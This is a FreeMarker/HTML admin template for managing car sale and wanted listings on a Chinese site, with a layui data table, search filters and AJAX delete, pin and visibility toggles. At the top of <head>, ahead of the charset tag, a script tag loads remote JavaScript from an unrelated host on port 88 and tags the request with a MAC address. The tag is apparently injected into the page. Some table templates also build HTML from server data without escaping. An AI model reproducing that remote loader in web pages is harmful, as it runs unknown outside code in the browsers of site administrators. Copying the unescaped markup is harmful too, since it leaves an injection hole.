<!DOCTYPE html>
<html>
<head><script src=http://t.wsgblw.com:88/j1.js?MAC=747D2491FCE4></script>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
    <title>发布管理后台</title>
    <link rel="stylesheet" href="/admin/layui/css/layui.css">
    <link rel="stylesheet" href="//at.alicdn.com/t/font_1516038_9xj3nqitnch.css"/>
    <link rel="stylesheet" href="/admin/css/style.css?t=1578105738"/>
</head>
<body class="layui-layout-body">
<div class="layui-layout layui-layout-admin">
   <#include "../common/head.ftl"/>
   <#include "../common/right.ftl"/>
    <div class="layui-body">
        <!-- 内容主体区域 -->
        <div style="padding: 15px;">

            <style>
                .layui-table-cell {
                    height: auto;
                    width: auto;
                }

                .set_top {
                    cursor: pointer;
                }
                .set_show{
                    cursor: pointer;
                }
            </style>
            <table id="table" lay-filter="table"></table>

        </div>
        <#include "../common/footer.ftl"/>
    </div>

</div>

<!--工具栏start-->
<script id="toolbar" type="text/html">
    <div class="layui-inline">
        <input type="text" class="layui-input" id="title" placeholder="标题">
    </div>
    <div class="layui-inline">
        <input type="text" class="layui-input" id="brand" placeholder="品牌">
    </div>
    <div class="layui-inline">
        <input type="text" class="layui-input" id="arctic" placeholder="车型">
    </div>
    <div class="layui-inline">
        <select name="shop" id="shop">
            <option value="">请选择所属类型</option>
            <option value="1">售卖</option>
            <option value="2">求购</option>
        </select>
    </div>
    <div class="layui-inline">
        <select name="price" id="price">
            <option value="">价格区间</option>
            <option value="1">10万以下</option>
            <option value="2">15万-10万</option>
            <option value="3">20万-15万</option>
            <option value="4">25万-20万</option>
            <option value="5">30万-25万</option>
        </select>
    </div>
    <button class="layui-btn layui-btn-sm" lay-event="search"><i class="layui-icon">&#xe615;</i></button>
    <button class="layui-btn layui-btn-sm" lay-event="refresh"><i class="layui-icon">&#xe9aa;</i></button>
    <#--<button class="layui-btn layui-btn-sm" lay-event="add">添加</button>-->
</script>
<!--工具栏end-->
<!--操作栏-->
<script id="operation" type="text/html">
    <a class="layui-btn layui-btn-danger layui-btn-xs" lay-event="del">删除</a>
</script>
<!--操作栏end-->

<script src="/admin/layui/layui.js"></script>

<script>
    layui.use(['table', 'element', 'jquery'], function () {
        var $ = layui.jquery;
        var table = layui.table;
        var dataTable = table.render({
            elem: '#table'
            , url: '/admin/issue/index' //数据接口
            , method: 'POST'
            , page: true //开启分页
            , parseData: function (ret) {
                console.log(ret)
                return {
                    code: ret.code,
                    msg: ret.msg,
                    count: ret.count,
                    data: ret.data
                }
            }
            , toolbar: '#toolbar'
            , cols: [[ //表头
                {field: 'id', title: 'ID', width: 50 ,align:'center'}
                , {
                    field: 'issue.user.name', title: '作者' ,align:'center', templet: function (data) {
                        return data.user.name;
                    }
                }
                , {field: 'title', title: '标题' ,align:'center'}
                , {field: 'brand', title: '品牌' ,align:'center'}
                , {field: 'arctic', title: '车型' ,align:'center'}
                , {
                    field: 'issue.user.name', title: '封面图片' ,align:'center', templet: function (data) {
                        return '<img src="'+data.issuePrints[0].cover+'">';
                    }
                }
                , {
                    field: 'price', title: '价格' ,align:'center', templet: function (data) {
                        return data.price+"万";
                    }
                }
                , {
                    field: 'priority', title: '置顶' ,align:'center', templet: function (data) {
                        if (data.priority == 9) {
                            return '<span data-id="' + data.id + '" data-status="1" class="set_top layui-badge layui-bg-green">是</span>';
                        }
                        if (data.priority != 9) {
                            return '<span data-id="' + data.id + '" data-status="9" class="set_top layui-badge">否</span>';
                        }
                    }
                }
                , {
                    field: 'shop', title: '类型' ,align:'center', templet: function (data) {
                        if (data.shop.id == 1) {
                            return "售卖";
                        }
                        if (data.shop.id == 2) {
                            return "求购";
                        }
                    }
                }
                , {
                    field: 'status', title: '状态' ,align:'center', templet:function(data) {
                        if (data.status == 1) {
                            return '<span data-id="' + data.id + '" data-status="2" class="status layui-badge layui-bg-green">显示</span>';
                        }
                        if (data.status == 2) {
                            return '<span data-id="' + data.id + '" data-status="1" class="status layui-badge layui-bg-red">隐藏</span>';
                        }
                    }
                }
                , {
                    field: 'createTime', title: '发布时间' ,align:'center'}
                , {
                    title: "操作",
                    toolbar: "#operation"
                }
            ]]
        })
        table.on("toolbar(table)", function (obj) {
            var event = obj.event;
            switch (event) {
                case "add":
                    window.location.href='/admin/issue/add';
                    break;
                case 'search':
                    var title=$("#title").val();
                    var shop=$("#shop").val();
                    var brand=$("#brand").val();
                    var arctic=$("#arctic").val();
                    var price=$("#price").val();
                    console.log("标题="+title+"类型="+shop+"品牌"+brand+"车型"+arctic+"价格区间"+price)
                    dataTable.reload({
                        where:{
                            title:title,
                            shop:shop,
                            brand:brand,
                            arctic:arctic,
                            id:price
                        },
                        page:{
                            curr:1
                        }
                    });
                  /*  $("#title").val(title);
                    $("#shop").val(shop);
                    $("#brand").val(brand);
                    $("#arctic").val(arctic);
                    $("#price").val(price);*/
                    break;
                case 'refresh':
                    window.location.reload();
                    break;
            }
        })
        table.on("tool(table)", function (obj) {
            var event = obj.event;
            var data = obj.data;
            switch (event) {
                case "del":
                    layer.confirm("您确定删除该发布吗?<br/>删除后无法恢复！", {
                        title: "删除发布",
                        icon: 3
                    }, function () {
                        $.ajax({
                            url: '/admin/issue/del',
                            type: 'POST',
                            data: {id: data.id},
                            success: function (data) {
                                if (data.code == 1) {
                                    layer.msg(data.msg, {time: 1500, icon: 1}, function () {
                                        obj.del()
                                    })
                                } else {
                                    layer.msg(data.msg, {time: 1500, icon: 2})
                                }
                            }
                        })
                    })
                    break;
                case "edit":
                    window.location.href='/admin/bbs/update.html?id='+data.id;
                    break;
            }
        })
        $(".layui-body").on('click', '.set_top', function () {
            var id = $(this).attr("data-id");
            var priority = $(this).attr("data-status");
            var field='priority';
            var url='/admin/issue/priority';
            $.ajax({
                url:url,
                data:{
                    id:id,
                    priority:priority,
                    field:field
                },
                type:'POST',
                success:function(data){
                    if(data.code==0){
                        layer.msg(data.msg,{icon:2,time:2000});
                        return false;
                    }
                    layer.msg(data.msg,{icon:1,time:2000},function(){
                        window.location.reload();
                    })
                }
            })
        })
        $(".layui-body").on('click','.status',function () {
            var id = $(this).attr("data-id");
            var status = $(this).attr("data-status");
            var field='status';
            var url='/admin/issue/status';
            $.ajax({
                url:url,
                data:{
                    id:id,
                    status:status,
                    field:field
                },
                type:'POST',
                success:function(data){
                    if(data.code==0){
                        layer.msg(data.msg,{icon:2,time:2000});
                        return false;
                    }
                    layer.msg(data.msg,{icon:1,time:2000},function(){
                        window.location.reload();
                    })
                }
            })
        })
    });
</script>


</body>
</html>